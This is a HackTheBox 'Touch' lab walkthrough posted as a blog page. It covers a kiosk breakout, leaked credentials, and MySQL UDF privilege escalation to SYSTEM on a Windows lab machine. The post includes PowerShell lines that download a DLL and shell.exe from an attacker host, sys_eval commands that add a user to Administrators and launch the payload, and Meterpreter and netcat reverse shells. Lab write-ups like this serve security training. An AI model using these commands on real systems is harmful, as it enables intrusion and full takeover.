@@ -1,0 +1,537 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Touch Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Touch Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/41/touch_done.png"><meta property="og:image:width" content="592"><meta property="og:image:height" content="305"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="This walkthrough covers the analysis of a Windows target environment. The attack path demonstrates how a combination of application logic&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-touch-walkthroug/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;399b33d25e97aaafdf782ff626f536c4"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-touch-walkthroug/"},"headline":"HackTheBox Touch Walkthrough","datePublished":"2026-10-04T11:07+05:30","dateModified":"2026-10-05T11:13+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/41/touch_done.png","height":305,"width":592},"description":"This walkthrough covers the analysis of a Windows target environment. The attack path demonstrates how a combination of application logic&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Touch Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-10-04T11:07" class="feed__date">October 4, 2026</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/41/touch_done.png" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_done-2xl.png 1920w" sizes="88vw" loading="eager" height="305" width="592" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p>This walkthrough covers the analysis of a Windows target environment. The attack path demonstrates how a combination of application logic flaws, local interface escapes, exposed administrative credentials, and permissive database service permissions can allow a low-privileged account to achieve full system access.</p><h4 id="machine-information">Machine Information</h4><p>In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they’ll come in handy here? <strong>Jenny Crawford</strong> / <strong>KS7X2M</strong></p><pre><code>[ Reusable Credentials ] ──&gt; [ Web Login &amp; Dashboard ] ──&gt; [ Kiosk GUI Escape ] ──&gt;  [ NT AUTHORITY\SYSTEM ] &lt;── [ MySQL UDF Loading ] &lt;── [ Hardcoded DB Secrets ]
+</code></pre><h2 id="recon">Recon</h2><h3 id="nmap">Nmap</h3><p>An initial scan of the target host (<code>10.129.43.220</code>) identified several standard management and web services:</p><pre><code>└─$ nmap  -Pn --min-rate=5000 -p- --reason $vip
+
+PORT     STATE SERVICE       REASON
+135/tcp  open  msrpc         syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127
+5985/tcp open  wsman         syn-ack ttl 127
+8443/tcp open  https-alt     syn-ack ttl 127
+
+└─$   nmap -A -min-rate=5000 -p135,3389,5985,8443 --reason $vip
+
+PORT     STATE SERVICE       REASON          VERSION
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Service
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8443/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-cors: GET POST PUT OPTIONS
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| http-title: Nexion DeviceHub - Login
+|_Requested resource was /login
+</code></pre><ul><li><code>135/tcp</code>MSRPC Microsoft Windows RPC</li><li><code>3389/tcp</code> RDPMicrosoft Terminal Services</li><li><code>5985/tcp</code>WinRMMicrosoft HTTPAPI httpd 2.0</li><li><code>8443/tcp</code>HTTPSNexion DeviceHub (<code>/login</code>)</li></ul><h2 id="enumeration">Enumeration</h2><h3 id="web_8443">Web_8443</h3><h4 id="directory-listing">Directory listing</h4><pre><code>└─$ feroxbuster -u http://10.129.43.2200:8443/
+
+403      GET        1l        2w       35c http://10.129.43.220:8443/api
+200      GET        1l       37w      452c http://10.129.43.220:8443/favicon.svg
+200      GET        1l       40w     3494c http://10.129.43.220:8443/css/style.css
+200      GET        3l      124w     3572c http://10.129.43.220:8443/login
+200      GET        3l      124w     3572c http://10.129.43.220:8443/login/
+400      GET        6l       26w      324c http://10.129.43.220:8443/error%1F_log
+400      GET        6l       26w      324c http://10.129.43.220:8443/login/error%1F_log
+403      GET        1l        2w       35c http://10.129.43.220:8443/api
+200      GET        1l        3w      116c http://10.129.43.220:8443/api/status
+405      GET        1l        3w       30c http://10.129.43.220:8443/api/scan
+400      GET        6l       26w      324c http://10.129.43.220:8443/api/error%1F_log
+</code></pre><p>Interrogating the web API endpoint revealed device metadata:</p><pre><code>└─$ curl http://10.129.43.220:8443/api/status | jq .
+{
+  &quot;device&quot;: &quot;Nexion DeviceHub DH-100&quot;,
+  &quot;serial&quot;: &quot;NX-DH-2024-B7042&quot;,
+  &quot;firmware&quot;: &quot;1.4.2&quot;,
+  &quot;status&quot;: &quot;online&quot;,
+  &quot;uptime&quot;: 51295
+}
+</code></pre><h4 id="emumeration-web">Emumeration web</h4><p>login succes with leak info</p><pre><code>┌──(h4ck3rfirst)-[~/shared/hackthebox/touch]
+└─$ curl &#39;http://10.129.43.220:8443/login&#39; -i -X POST -d &#39;password=NX-DH-2024-B7042&#39;            
+
+HTTP/1.1 302 Found
+Transfer-Encoding: chunked
+Location: /dashboard
+Server: Microsoft-HTTPAPI/2.0
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS
+Access-Control-Allow-Headers: Content-Type
+Set-Cookie: nxsession=e16e08eca38c489bbe6e0602e6bffdec; Path=/
+Date: Sun, 04 Oct 2026 14:53:22 GMT
+</code></pre><p>Using the serial number discovered in <code>/api/status</code> allowed initial authentication to the DeviceHub login interface at port <code>8443</code>. Upon inspecting the authenticated dashboard, a set of local system credentials was discovered:</p><ul><li><strong>Username:</strong> <code>KioskUser</code></li><li><strong>Password:</strong> <code>K!0sk2026#</code></li></ul><p></p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_cred_leak.png" alt="Image description" width="1287" height="762" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_cred_leak-2xl.png 1920w"></figure>KioskUser : K!0sk2026#<p></p><p>click on every found functionality to enumerate</p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_poweroff-scanner.png" alt="touch_htb_poweroff-scanner.png" width="1291" height="559" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_poweroff-scanner-2xl.png 1920w"></figure><p></p><h4 id="rdp_as_kioskuser">rdp_as_kioskuser</h4><p>Connecting to the target via Remote Desktop Protocol (RDP) using the <code>KioskUser</code> credentials presented a locked-down kiosk interface.</p><pre><code>remmina --connect=rdp://KioskUser:&#39;K!0sk2026#&#39;@$vip
+</code></pre><p>i start with</p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_htbairways.png" alt="touch_htb_htbairways.png" width="1291" height="693" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_htbairways-2xl.png 1920w"></figure><p></p><p>Clicks on the bottom page. After chosing a language. Fill a booking detail with <strong>Jenny Crawford</strong> / <strong>KS7X2M</strong> . U see the document varification. Not worked.</p><p>then i look on staff login . Triggering Error Handlers: Navigating to the staff badge scanner interface and attempting to trigger an unhandled error event surfaced an embedded browser control.</p><figure class="post__image"><img src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_staff_login.png" alt="touch_htb_staff_login.png" width="1289" height="688" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_staff_login-2xl.png 1920w"></figure><p></p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_scan_badge.png" alt="touch_htb_scan_badge.png" width="840" height="495" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scan_badge-2xl.png 1920w"></figure><p>when i exploring the <a href="http://10.129.43.220:8443">http://10.129.43.220:8443</a> site i power off the scanner. when i come on rdp staff the badge scanner. i click on scan badge it pop.Clicking external support links inside the error dialog forced the underlying operating system to launch a full instance of Microsoft Edge.</p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_scanner_click.png" alt="touch_htb_scanner_click.png" width="1042" height="541" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_scanner_click-2xl.png 1920w"></figure>then link on error url give u microsoft edge brower.<p></p><p></p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_hth_error_staff.png" alt="touch_hth_error_staff.png" width="1273" height="717" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_hth_error_staff-2xl.png 1920w"></figure>From the browser’s native file dialog (<code>Control + O</code> or via file download prompts <code>C:\\\</code> ), navigation to <code>C:\Windows\System32\cmd.exe</code> allowed spawning a standard command prompt running in the context of <code>KioskUser</code>.<p></p><p></p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_downlaod.png" alt="touch_htb_downlaod.png" width="1276" height="678" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_downlaod-2xl.png 1920w"></figure>open that file in file explorer<p></p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/41/touch_htb_as_kiosk_cmd.png" alt="touch_htb_as_kiosk_cmd.png" width="1140" height="616" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/41/responsive/touch_htb_as_kiosk_cmd-2xl.png 1920w"></figure><h3 id="reverse_shell_kiosk">reverse_shell_kiosk</h3><p>Once low-privileged command execution was established, local system enumeration revealed two critical misconfigurations:</p><p>Get a reverse shell on msfconsole.</p><pre><code>run
+[*] Started reverse TCP handler on 10.10.xx.xxx:4443
+[*] Sending stage (203452 bytes) to 10.129.31.47
+[*] Meterpreter session 1 opened (10.10.xx.xxx:4443 -&gt; 10.129.31.47:62187)
+
+meterpreter &gt; shell
+</code></pre><h2 id="privilege-escalation">privilege escalation</h2><p><strong>Service Account Discovery:</strong> A local database instance (<strong>MySQL80</strong>) was actively running under the elite security context of <strong><code>LocalSystem</code></strong>.</p><pre><code>=========|| Checking for Unquoted Service Paths
+Fetching the list of services, this may take a while...
+Unquoted Service Path found!
+Name: MySQL80
+PathName: C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
+StartName: LocalSystem
+StartMode: Auto
+Running: Running
+</code></pre><p>Inspecting scheduled tasks and system scripts in <code>C:\ProgramData\</code> revealed a maintenance batch file (<code>refresh-dates.bat</code>) exposed hardcoded database root credentials</p><pre><code>PS C:\Users\KioskUser&gt; type &quot;C:\ProgramData\HTB Airways\refresh-dates.bat&quot;
+type &quot;C:\ProgramData\HTB Airways\refresh-dates.bat&quot;
+@echo off
+C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 &lt; &quot;C:\ProgramData\HTB Airways\refresh-dates.sql&quot; 2&gt;nul
+</code></pre><p>Because your current user (<code>KioskUser</code>) is an authenticated user on the system, <strong>you have full permissions to write, delete, and modify files inside this folder.</strong> To pivot away from restricted file writing, we enumerated the database plugin architecture: <code>SHOW VARIABLES LIKE &#39;plugin_dir&#39;;</code> – Result: C:\MySQL\lib\plugin\</p><pre><code>C:\Users\KioskUser&gt;icacls &quot;C:\MySQL\lib\plugin&quot;
+icacls &quot;C:\MySQL\lib\plugin&quot;
+C:\MySQL\lib\plugin BUILTIN\Administrators:(I)(OI)(CI)(F)
+                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                    BUILTIN\Users:(I)(OI)(CI)(RX)
+                    NT AUTHORITY\Authenticated Users:(I)(M)
+                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+</code></pre><p><strong>Write (<code>W</code> / <code>M</code>) permissions</strong> over the system <code>C:\ProgramData</code> directory.</p><pre><code>C:\Users\KioskUser&gt;powershell -c &quot;Invoke-WebRequest -Uri &#39;http://10.10.16.153/lib_mysqludf_sys.dll&#39; -OutFile &#39;C:\MySQL\lib\plugin\lib_mysqludf_sys.dll&#39;&quot;
+</code></pre><p>the <code>CREATE FUNCTION</code> statement is used to extend the database server’s capabilities by adding User Defined Functions (UDFs) backed by external compiled libraries.</p><pre><code>C:\Users\KioskUser&gt;C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e &quot;CREATE FUNCTION sys_eval RETURNS string SONAME &#39;lib_mysqludf_sys.dll&#39;;&quot;
+C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e &quot;CREATE FUNCTION sys_eval RETURNS string SONAME &#39;lib_mysqludf_sys.dll&#39;;&quot;
+mysql: [Warning] Using a password on the command line interface can be insecure.
+
+C:\Users\KioskUser&gt;C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e &quot;SELECT sys_eval(&#39;net localgroup Administrators KioskUser /add&#39;);&quot;
+</code></pre><p>run the native Windows command <code>net localgroup Administrators KioskUser /add</code>. Adds the standard user (<code>KioskUser</code>) to the local <code>Administrators</code> group.</p><p>Downloads an executable (<code>shell.exe</code>) to <code>C:\ProgramData\</code>.</p><pre><code>C:\Users\KioskUser&gt;powershell -c &quot;Invoke-WebRequest -Uri &#39;http://10.10.16.153/shell.exe&#39; -OutFile &#39;C:\ProgramData\shell.exe&#39;&quot;
+powershell -c &quot;Invoke-WebRequest -Uri &#39;http://10.10.16.153/shell.exe&#39; -OutFile &#39;C:\ProgramData\shell.exe&#39;&quot;
+</code></pre><p>Exectuating the shell.exe file with sys_eval .The <code>sys_eval</code> function acts as a programming bridge, taking whatever string text is placed inside its single quotes and passing it straight to the native Windows command execution API (<code>system()</code> or <code>CreateProcess()</code>).</p><pre><code>C:\Users\KioskUser&gt;C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e &quot;SELECT sys_eval(&#39;cmd.exe /c start /b C:\\ProgramData\\shell.exe&#39;);&quot;
+</code></pre><ul><li><code>-e</code> flag stands for <strong>execute</strong></li><li><code>cmd.exe /c</code>: Opens a silent, temporary , then terminates itself instantly.</li><li><code>start</code>: A built-in command prompt utility used to launch separate window processes.</li><li><code>/b</code>: Tells Windows to run the application <strong>in the background</strong> as a detached,</li></ul><h3 id="reverse_shell_anthority_system">reverse_shell_anthority_system</h3><pre><code>└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.153] from (UNKNOWN) [10.129.43.220] 51711
+Microsoft Windows [Version 10.0.26100.9457]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\MySQL\data&gt;whoami
+whoami
+nt authority\system
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on October 5, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/mysql/">mysql</a></li><li><a href="https://h4ck3rfirst.github.io/tags/rdp/">RDP</a></li><li><a href="https://h4ck3rfirst.github.io/tags/touchhtb/">touch.htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/udf-hijacking/">UDF hijacking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/">Windows</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-touch-walkthroug%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Touch%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-touch-walkthroug%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Touch%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-touch-walkthroug%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-06-06T08:11" class="feed__date">June 6, 2026</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough-4/">Tryhackme Operation Endgame Walkthrough </a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Operation endgame hackthebox Difficulty: Medium OS: Windows (Active Directory) Platform: TryHackMe Category:&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-21T18:18" class="feed__date">September 21, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/">HackTheBox Expressway Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---.</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
